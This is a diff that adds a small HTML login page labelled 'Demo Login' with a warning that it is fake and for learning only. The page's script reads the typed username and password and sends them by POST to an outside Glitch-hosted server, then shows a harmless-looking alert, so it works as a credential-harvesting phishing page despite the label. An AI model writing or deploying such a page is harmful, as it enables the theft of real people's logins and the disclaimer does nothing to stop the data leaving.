@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Demo Login Page</title>
+    <style>
+        body {
+            background-color: lightgray;
+            text-align: center;
+            font-family: Arial;
+        }
+        .box {
+            background-color: white;
+            width: 300px;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid black;
+            margin-top: 100px;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid gray;
+        }
+        button {
+            background-color: green;
+            color: white;
+            padding: 10px;
+            border: none;
+        }
+        .warning {
+            color: red;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Demo Login</h2>
+        <p class="warning">This is FAKE! For learning only. Don’t use real info.</p>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Type username" required>
+            <input type="password" id="password" placeholder="Type password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            fetch('https://ebony-delicious-blob.glitch.me/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('You typed something! This is a demo.');
+            });
+        });
+    </script>
+</body>
+</html>
